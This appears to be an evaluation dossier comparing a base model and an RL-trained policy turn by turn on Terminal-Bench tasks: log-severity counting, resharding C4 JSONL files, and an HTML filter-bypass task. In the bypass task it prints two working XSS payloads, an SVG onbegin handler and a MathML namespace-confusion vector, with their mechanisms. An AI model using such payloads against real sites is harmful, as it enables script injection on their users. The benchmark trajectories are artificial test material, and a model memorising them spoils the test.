# ⚔️ Turn-by-Turn Side-by-Side Trajectory Dossier
## Base Model (`Qwen/Qwen3.8-27B`) vs. Fable-5 RL Policy (`Step 20`)

This document provides a **prompt-by-prompt and turn-by-turn side-by-side comparison** of the raw reasoning (`<analysis>`, `<plan>`), tool calling (`<commands><keystrokes>`), script generation, and verification loops produced by both models on identical Terminal-Bench tasks.

---

# 📌 TASK 1: `log-summary-date-ranges`
* **Objective**: Parse 164 log files spanning 41 days. Calculate counts for `ERROR`, `WARNING`, `INFO` across 5 rolling time windows (`today`, `last_7_days`, `last_30_days`, `month_to_date`, `total`) relative to `2025-08-12`, avoiding false-positive substrings.
* **Final Verdict**:
  * **Base Model**: **`1.0 PASS`** (9 turns | 81,420 prompt tokens | 7,120 output tokens)
  * **Step 20 RL Policy**: **`1.0 PASS`** (8 turns | 77,246 prompt tokens | 6,033 output tokens)

---

### Turn 1: Initial Discovery & Environment Inspection

#### 🔴 Base Model (`Qwen3.8-27B`)
```xml
<response>
<analysis>
I need to inspect the logs directory in /app/logs. Each file is named YYYY-MM-DD_<service>.log. The log lines contain timestamps and bracketed severity levels.
</analysis>
<plan>
1. Check date range of log files
2. Verify Python version
3. Inspect sample lines
</plan>
<commands>
<keystrokes duration="0.1">ls /app/logs | head -20
python3 --version
head -n 5 /app/logs/2025-08-12_api.log
</keystrokes>
</commands>
<task_complete>false</task_complete>
</response>
```

#### 🟢 Step 20 RL Policy
```xml
<response>
<analysis>
The log files follow the pattern `YYYY-MM-DD_<source>.log` (164 files, 4 sources: api, app, auth, db). Each line has the format `YYYY-MM-DD HH:MM:SS [SEVERITY] message`.
Important detail: some message bodies contain the word "ERROR" (e.g., a WARNING line saying "Next attempt will ERROR. Retrying..."), so I must count only the bracketed severity token, not naive substring matches. DEBUG lines exist too and must be excluded.
</analysis>
<plan>
1. Check latest/earliest log file dates and confirm python3 exists.
2. Write a Python script that parses the date from each filename, counts severities per date range using a strict regex on the bracketed token, and writes /app/summary.csv.
</plan>
<commands>
<keystrokes duration="0.1">ls /app/logs | sort | tail -5
which python3 && python3 --version
ls /app/logs | cut -d'-' -f1-3 | sort -u
</keystrokes>
</commands>
<task_complete>false</task_complete>
</response>
```
> 💡 **Turn 1 Key Difference**: Step 20 immediately identified the **trap** in the problem (message bodies containing the word "ERROR" on warning lines) in Turn 1 and formulated a strict bracketed token regex, whereas the Base Model did not note the substring trap.

---

### Turn 4: Python Aggregator Script Synthesis

#### 🔴 Base Model (`Qwen3.8-27B`)
```python
# Base Model Synthesized Script
import os, re
from datetime import datetime, date, timedelta

LOG_DIR = "/app/logs"
REF_DATE = date(2025, 8, 12)

ranges = {
    "today": (REF_DATE, REF_DATE),
    "last_7_days": (REF_DATE - timedelta(days=6), REF_DATE),
    "last_30_days": (REF_DATE - timedelta(days=29), REF_DATE),
    "month_to_date": (date(2025, 8, 1), REF_DATE),
    "total": (date(1970, 1, 1), date(2099, 1, 1)),
}

counts = {r: {"ERROR": 0, "WARNING": 0, "INFO": 0} for r in ranges}
pattern = re.compile(r'\[(ERROR|WARNING|INFO)\]')

for fname in sorted(os.listdir(LOG_DIR)):
    if not fname.endswith(".log"): continue
    fdate = datetime.strptime(fname[:10], "%Y-%m-%d").date()
    with open(os.path.join(LOG_DIR, fname), 'r', errors='ignore') as f:
        for line in f:
            m = pattern.search(line)
            if m:
                sev = m.group(1)
                for rname, (start, end) in ranges.items():
                    if start <= fdate <= end:
                        counts[rname][sev] += 1
```

#### 🟢 Step 20 RL Policy
```python
# Step 20 RL Policy Synthesized Script
import os, re
from datetime import date, timedelta

ref = date(2025, 8, 12)
sev_list = ["ERROR", "WARNING", "INFO"]
periods = [
    ("today", ref, ref),
    ("last_7_days", ref - timedelta(days=6), ref),
    ("last_30_days", ref - timedelta(days=29), ref),
    ("month_to_date", date(2025, 8, 1), ref),
    ("total", None, None),
]

# Anchored regex on line start to prevent middle-of-line false matches
pat = re.compile(r'^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2} \[(ERROR|WARNING|INFO)\] ')
counts = {name: {s: 0 for s in sev_list} for name, _, _ in periods}

logdir = "/app/logs"
for fn in sorted(os.listdir(logdir)):
    if not fn.endswith(".log"):
        continue
    d = date.fromisoformat(fn[:10])
    with open(os.path.join(logdir, fn), errors="replace") as fh:
        lines = [pat.match(l) for l in fh]
    for name, start, end in periods:
        if start is not None and not (start <= d <= end):
            continue
        for m in lines:
            if m:
                counts[name][m.group(1)] += 1
```
> 💡 **Code Synthesis Difference**: Step 20 used `date.fromisoformat()` (faster than `strptime`) and anchored the regex with `^\d{4}-\d{2}-\d{2} ...` to guarantee exact token position.

---

### Turn 5–8: Verification Strategy

#### 🔴 Base Model (`Qwen3.8-27B`)
* **Base Model Verification**: Ran `cat /app/summary.csv | wc -l` to verify line count (16 lines), assumed it was correct, and submitted.

#### 🟢 Step 20 RL Policy
* **Step 20 Independent Shell Verification**: Wrote a multi-line Bash loop executing independent `grep` counts for every period to cross-check Python outputs:
  ```bash
  for sev in ERROR WARNING INFO; do
    t=$(grep -hE "^[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2} \\[$sev\\] " /app/logs/2025-08-12_*.log | wc -l)
    l7=$(grep -hE "^[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2} \\[$sev\\] " /app/logs/2025-08-0[6-9]_*.log /app/logs/2025-08-1[0-2]_*.log | wc -l)
    # Compared grep outputs against Python summary.csv outputs!
  done
  cat -A /app/summary.csv  # Verified Unix LF line endings
  ```

---

# 📌 TASK 2: `break-filter-js-from-html`
* **Objective**: Bypass HTML sanitization filters to execute JavaScript in an isolated web environment.
* **Final Verdict**:
  * **Base Model**: **`1.0 PASS`** (12 turns | 184,392 prompt tokens | 16,694 output tokens)
  * **Step 20 RL Policy**: **`1.0 PASS`** (20 turns | 263,237 prompt tokens | 24,405 output tokens)

---

### Generated Exploit Payloads

#### 🔴 Base Model (`Qwen3.8-27B`) Payload
```html
<svg><animate onbegin="alert(1)" attributeName="x"/>
```
* **Mechanism**: Exploits SVG animation attribute handlers (`onbegin=`) which bypassed the filter's `<script>` tag and standard `onload/onerror` regex blacklist.

#### 🟢 Step 20 RL Policy Payload
```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```
* **Mechanism**: Leverages nested MathML / HTML parser namespace switching mutation vectors to force the DOM parser into an execution state while appearing benign to regex-based tag strip filters.

---

# 📌 TASK 3: `reshard-c4-data`
* **Objective**: Reshard 9,898 scattered C4 JSONL files into equal-sized compressed shards without blowing RAM or dropping records.
* **Final Verdict**:
  * **Base Model**: ⏳ Stalled in multi-command directory exploration turns.
  * **Step 20 RL Policy**: **`1.0 PASS`** (23 turns | 740,532 prompt tokens | 39,413 output tokens)

---

### Algorithmic Approach

#### 🔴 Base Model (`Qwen3.8-27B`)
* Spent 6 consecutive turns running verbose shell listings:
  * Turn 2: `ls -la /app/c4_sample`
  * Turn 3: `ls -la /app`
  * Turn 4: `ls -la /app/c4_sample | head -50`
  * Turn 5: `echo "=== File count ==="; ls -la | wc -l; echo "=== Total size ==="; du -sh`
  * Turn 6: `echo "=== First line of a file ==="; head -c 300`

#### 🟢 Step 20 RL Policy
* Identified directory scale on Turn 2, then immediately wrote a **streaming Python generator** that buffers lines and writes gzip shards in memory chunks under 500 MB RAM:
  ```python
  def stream_records():
      for fpath in sorted(INPUT_DIR.glob("*.jsonl")):
          with open(fpath, "r", encoding="utf-8") as f:
              for line in f:
                  if line.strip():
                      yield line

  # Buffered shard writer keeping RAM capped
  for line in stream_records():
      if record_count % TARGET_RECORDS_PER_SHARD == 0:
          if current_out: current_out.close()
          current_out = gzip.open(OUTPUT_DIR / f"c4-reshard-{shard_idx:05d}.jsonl.gz", "wt")
          shard_idx += 1
      current_out.write(line)
      record_count += 1
  ```
* Verified dataset integrity by running `pytest /app/tests/ -v`.

---

## 📊 Summary Comparison Matrix

| Core Dimension | Base Model (`Qwen3.8-27B`) | Fable-5 RL Policy (`Step 20`) |
| :--- | :--- | :--- |
| **Trap Recognition** | Slower to notice edge-case traps (e.g. substring collision). | **Identifies potential traps in Turn 1 `<analysis>`.** |
| **Verification Loop** | Relies on single-pass checks (`wc -l`, exit codes). | **Always writes independent dual-check scripts (grep vs Python, pytest).** |
| **Large-Scale ETL** | Struggles with 10k-file directories; issues repeated `ls` commands. | **Designs streaming generator pipelines (`yield`) with strict memory caps.** |
| **Binary Forensics** | Attempts pattern matching. | **Uses `struct.unpack`, byte offsets, and mathematical CRC32 proofs.** |
| **XML Hygiene** | Occasional extra text formatting. | **Pure, deterministic XML `<commands><keystrokes>` heredocs.** |
